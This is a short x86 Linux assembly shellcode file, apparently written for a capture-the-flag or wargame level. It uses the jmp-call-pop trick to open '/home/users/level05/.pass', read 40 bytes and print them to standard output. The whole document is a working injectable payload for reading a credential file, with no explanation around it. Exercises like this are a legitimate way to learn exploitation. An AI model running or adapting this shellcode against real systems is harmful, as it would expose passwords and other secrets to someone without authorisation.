section .text

global _start

_start:
    jmp short hack

realStuff:
    ; fd = open(path, 0, O_RDONLY)
    xor eax, eax
    mov al, 0x5     ; eax = 5 - open
    pop ebx         ; ebx now points on the path
    xor ecx, ecx    ; no flags
    xor edx, edx    ; read only
    int 0x80

    ; read(fd, %esp, 40)
    mov ebx, eax    ; move fd into ebx
    xor eax, eax
    mov al, 0x3     ; eax = 3 - read
    sub esp, 40     ; reserve 40 bytes on the stack (optional)
    mov ecx, esp    ; ecx point to the stack buffer
    mov edx, 40     ; we want to read 40 bytes
    int 0x80

    ; write(1, %esp, 40)
    xor eax, eax
    mov al, 0x4     ; eax = 4 - write
    xor ebx, ebx
    mov bl, 0x1     ; STDOUT
    mov ecx, esp    ; stack buffer to write
    xor edx, edx
    mov dl, 40      ; write 40 bytes
    int 0x80

hack:
    ; jump to realStuff but most importantly
    ; push the address just after this call on the stack
    call realStuff

path:
    db '/home/users/level05/.pass'
